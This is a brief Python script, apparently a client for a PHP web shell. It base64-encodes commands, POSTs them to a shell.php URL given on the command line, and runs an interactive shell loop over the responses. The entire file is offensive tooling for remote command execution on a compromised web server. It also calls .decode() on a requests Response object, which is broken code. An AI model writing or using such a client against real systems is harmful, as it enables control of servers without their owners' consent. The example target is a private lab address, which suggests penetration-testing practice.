import base64
import sys

import requests

from pyshell import PyShell


def make_request(timeout, cmd, opts, no_decode=False):
    data = {
        'cmd': base64.b64encode(cmd.encode('ascii')).decode(),
        'opts': base64.b64encode(opts.encode('ascii')).decode()
    }
    result = requests.post(url, data=data, timeout=timeout)
    if no_decode:
        return result
    return result.decode()


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('\nUsage: python3 {} URL\n'.format(sys.argv[0]))
        print('For example:\npython3 {} {}\n'.format(sys.argv[0], 'http://192.168.56.101/shell.php'))
        exit(0)

    url = sys.argv[1]

    p = PyShell(handler=make_request)
    p.run()
